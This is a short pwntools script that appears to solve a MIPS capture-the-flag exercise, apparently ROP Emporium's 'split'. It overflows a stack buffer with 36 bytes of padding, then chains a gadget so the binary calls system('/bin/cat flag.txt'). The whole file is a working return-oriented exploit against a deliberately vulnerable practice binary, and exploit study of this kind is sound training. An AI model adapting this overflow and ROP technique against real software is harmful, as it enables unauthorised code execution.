from pwn import *
io = process("qemu-mipsel -L /usr/mipsel-linux-gnu split_mipsel",shell=True)

gadget = 0x00400a1c # nop; lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;

# system("/bin/cat flag.txt")
payload = b""
payload += b"A"*36
payload += p32(gadget)
payload += p32(0)
payload += p32(0x00400b70)       # $t9 =  &system
payload += p32(0x00411010)       # $a0 =  "/bin/cat flag.txt"

io.send(payload)
io.interactive()
